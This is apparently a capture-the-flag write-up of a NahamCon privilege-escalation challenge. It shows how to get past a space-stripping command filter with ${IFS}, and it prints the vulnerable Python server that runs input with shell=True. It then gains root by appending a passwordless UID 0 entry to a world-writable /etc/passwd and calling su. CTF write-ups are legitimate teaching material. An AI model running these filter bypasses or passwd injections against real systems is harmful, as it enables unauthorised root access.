# Brief Writeup

## Description
> Author: [@JohnHammond#6971](https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw)

`I've never felt this close to a character before. I hope the feeling is mutual...  `

## Writeup

This was a privilege escalation challenge, and the reason for the name becomes immediately obvious.

```shell
kali@transistor:~/ctf/nahamcon$ nc challenge.nahamcon.com 31595
user@challenge:~$ ls -la
/bin/sh: 1: ls-la: not found
```

It seems like they're removing the spaces between the parts of our commands. This isn't really that hard to bypass if you're familiar with [Command Injection bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space). In Linux, the [`$IFS`](https://bash.cyberciti.biz/guide/$IFS) environment variable is a special variable that can be used to split up words in a line, but becomes especially useful when spaces are banned.

> At this point, it's super easy to automate creating these commands instead of typing them out everytime. Just use something like Python or CyberChef to take in an input, and then replace all spaces with `${IFS}`. It's not perfect, because working with quotes will be finnicky, but the privesc doesn't really require that.

```shell
user@challenge:~$ ls${IFS}-la
total 28
dr-xr-xr-x 1 user user 4096 Dec 11 19:23 .
drwxr-xr-x 1 root root 4096 Dec 11 19:23 ..
-rw-r--r-- 1 user user  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 user user 3526 Mar 27  2022 .bashrc
-rw-r--r-- 1 user user  807 Mar 27  2022 .profile
-r-xr-xr-x 1 root root 1885 Dec 11 19:22 .server.py
-rw-r--r-- 1 root root  174 Dec 11 19:22 README.md
```

We can also read files without using spaces using redirection operators.
```shell
user@challenge:~$ cat<README.md
Your objective to escalate your privileges
and retrieve the flag in /root/flag.txt.

If you look around the filesystem, you may
find some odd permissions you can leverage :)
```

Reading the `.server.py` we understand what we're up against.
```python
user@challenge:~$ cat<./.server.py
#!/usr/bin/env python3

import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *
from colorama import *
import subprocess

prompt = f"{Fore.GREEN}{Style.BRIGHT}user@challenge{Fore.RESET}{Style.NORMAL}:{Fore.CYAN}{Style.BRIGHT}~{Fore.RESET}{Style.NORMAL}$ "

class Service(socketserver.BaseRequestHandler):

    def handle(self):


        while ( 1 ):
            command = self.receive(prompt)
            no_spaces = command.replace(" ","")
            no_spaces = no_spaces.replace("\t","")
            no_spaces = no_spaces.replace("\n","")
            if no_spaces == "exit":
                return
            print(no_spaces)
            p = subprocess.Popen(no_spaces, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = p.communicate()
            self.send(stderr + stdout)


    def send(self, string, newline=True):
        if type(string) is str:
            string = string.encode("utf-8")

        if newline:
            string = string + b"\n"
        self.request.sendall(string)

    def receive(self, prompt="> "):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip().decode("utf-8")


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():

    port = 1337

    host = '0.0.0.0'

    service =  Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True

    server_thread = threading.Thread(target=server.serve_forever)

    server_thread.daemon = True
    server_thread.start()

    print( "Server started on " + str(server.server_address) + "!")

    # Now let the main thread just wait...
    while ( True ): sleep(10)

if __name__ == "__main__":
    main()
```

So it's just a noninteractive shell. Taking the hint from the README, I looked for SUID files, what files I owned, and what files should have specific permissions when I stumbled across this.

```shell
user@challenge:~$ ls${IFS}-la${IFS}/etc/passwd
-rw-rw-rw- 1 root root 959 Dec 11 19:23 /etc/passwd
```

The `/etc/passwd` has a record of all of the users on the machine. Despite it being the "password" file, all of the password hashes are now stored in `/etc/shadow` (although who knows about legacy systems). That being said, if you can write to the `/etc/passwd` file, you can basically add a new user with root privileges, because the system will be none the wiser if there's just a new entry from nowhere.

> Reference: [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd)

Since our shell is not interactive, we cannot use the password prompt. Any commands that would let us automate that are not installed on the system. We can, however, add a user with no password, and then use `su` to run a command as another user.

```shell
user@challenge:~$ echo${IFS}'dummy::0:0::/root:/bin/bash'${IFS}>>/etc/passwd

user@challenge:~$ su${IFS}-${IFS}dummy${IFS}-c${IFS}"whoami"
root
```

Using the file read trick from before, we read the flag.

```shell
user@challenge:~$ su${IFS}-${IFS}dummy${IFS}-c${IFS}"cat</root/flag.txt"
flag{59af40c07bc6f02b457aa4c15543da2d}
```
